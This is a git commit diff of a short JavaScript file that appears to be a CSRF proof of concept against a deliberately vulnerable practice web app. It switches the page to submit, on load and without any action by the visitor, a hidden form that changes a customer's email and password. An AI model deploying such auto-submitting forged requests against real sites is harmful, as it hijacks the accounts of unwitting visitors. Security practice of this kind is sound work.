bf4c1a65cc2c1fb0c8cac5d07567f122c68111d4
kotonekurita <kotone.kurita@di-v.co.jp>
2021-03-12 19:04:08 +0900

    Update csrf.js

--- docs/csrf.js
+++ docs/csrf.js
@@ -4,20 +4,13 @@ window.addEventListener("DOMContentLoaded", () => {
   const form = document.querySelector('#csrf-form');
   // const form = document.getElementById('csrf-form');
 
-
-//   const formObj = `<form action="https://vulnerable-app1.herokuapp.com/customers/edit" method="post" id="csrf-form" >
-//   <input type="hidden" name="customer[email]" value="top@gun" />
-//   <input type="hidden" name="customer[password]" value="tomcruise" />
-//   <input type="hidden" name="customer[password_confirmation]" value="tomcruise" />
-// </form>`;
-
-  const formData = new FormData(form);
-  const XHR = new XMLHttpRequest(formData);
-    XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/edit", true);
-    XHR.responseType = "json";
-    XHR.send(formData);
-    XHR.onload = () => {
-      conssole.log("ok")
-    }
-  // form.submit()
+  // const formData = new FormData(form);
+  // const XHR = new XMLHttpRequest(formData);
+  //   XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/edit", true);
+  //   XHR.responseType = "json";
+  //   XHR.send(formData);
+  //   XHR.onload = () => {
+  //     conssole.log("ok")
+  //   }
+  form.submit()
 })
